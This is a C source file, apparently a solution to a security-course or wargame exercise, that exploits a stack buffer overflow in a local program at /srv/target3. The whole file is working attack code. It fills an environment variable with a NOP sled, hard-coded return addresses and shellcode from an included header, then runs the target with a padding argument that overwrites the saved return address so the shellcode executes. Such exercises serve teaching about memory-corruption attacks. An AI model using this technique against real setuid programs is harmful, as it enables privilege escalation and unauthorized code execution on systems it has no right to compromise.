#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"
const size_t EnvSize = 400;
const uintptr_t BaseAddress = 0xffffdec0;
const size_t NopSledSize = 201;
const uint8_t Nop = 0x90;
const size_t RetAddrOffset = 4;

const uintptr_t StartAddress = BaseAddress + RetAddrOffset;
const uintptr_t SecondAddress = BaseAddress + 2 * RetAddrOffset;
const char Padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";

void prepareEnvironment(char *environment) {
    memset(environment, Nop, EnvSize - 1);
    *(uintptr_t *)(environment) = StartAddress;
    *(uintptr_t *)(environment + RetAddrOffset) = SecondAddress;
    memcpy(environment + NopSledSize, shellcode, sizeof(shellcode));
    environment[EnvSize - 1] = '\0';
}

int main(void) {
    char *arguments[] = {TARGET, Padding, NULL};
    static char environment[EnvSize];

    prepareEnvironment(environment);

    char *env[] = {environment};

    execve(TARGET, arguments, env);
    perror("Execve failed");

    return 0;
}
